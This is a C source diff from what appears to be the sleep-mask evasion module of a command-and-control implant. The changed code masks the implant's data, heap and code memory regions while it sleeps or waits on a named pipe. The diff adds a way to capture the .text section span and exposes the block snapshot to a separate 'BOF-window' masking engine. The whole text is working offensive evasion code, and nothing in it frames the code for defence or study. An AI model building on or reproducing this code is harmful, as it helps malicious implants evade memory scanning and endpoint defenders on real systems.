@@ -207,7 +207,7 @@ static unsigned long long g3_chk(const unsigned char * p, unsigned long len)
 /* Snapshot of the block list, taken before any region is touched: masking
  * .data corrupts gparms (which points into .data) and the heap_records
  * array (in .bss) mid-walk, so the walk itself must run off local copies. */
-static int g3_snapshot_blocks(G3_BLOCK * out, int max)
+static int g3_snapshot_blocks(G3_BLOCK * out, int max, DWORD * text_span)
 {
 	GARGLEP parms = *gparms;
 	HEAP_RECORD * hr = track_memory_get_heap_records_to_mask();
@@ -247,6 +247,10 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 				DWORD vsz = *(DWORD *)(so + 8);
 				text_va = *(DWORD *)(so + 12);
 				text_end = text_va + (vsz ? vsz : *(DWORD *)(so + 16));
+				if (text_span != NULL) {
+					text_span[0] = text_va;
+					text_span[1] = text_end;
+				}
 				break;
 			}
 		}
@@ -761,7 +765,7 @@ BOOL gen3_sleep(DWORD time)
 			k[i] = bigger_rand();
 	}
 
-	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
+	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS, NULL);
 	g3_log("sleep: nblocks", nblocks);
 
 	mctx.blocks = blocks;
@@ -874,7 +878,7 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 			k[i] = bigger_rand();
 	}
 
-	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
+	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS, NULL);
 	if (nblocks == 0)
 		return FALSE;
 
@@ -903,6 +907,18 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 	if (w.r || w.err == ERROR_PIPE_CONNECTED)
 		return TRUE; /* connected (or a client had connected before us) */
 	return FALSE;   /* caller takes the plan-B loop for error handling */
+}
+
+/* snapshot accessor for the BOF-window engine (see sleepmask_bofwin.cpp):
+ * the same block list gen3_sleep masks, plus the first .text section span
+ * so the window can mask it separately. Runs before any region is touched. */
+int g3_snapshot_for_bofwin(G3_BLOCK * out, int max, DWORD * text_span)
+{
+	if (out == NULL || gparms == NULL)
+		return 0;
+	if (!g_inited && !g3_init())
+		return 0;
+	return g3_snapshot_blocks(out, max, text_span);
 }
 
 #else /* !_M_X64: x86 gen3-1a REMOVED (round 23) - the slice compiles but the
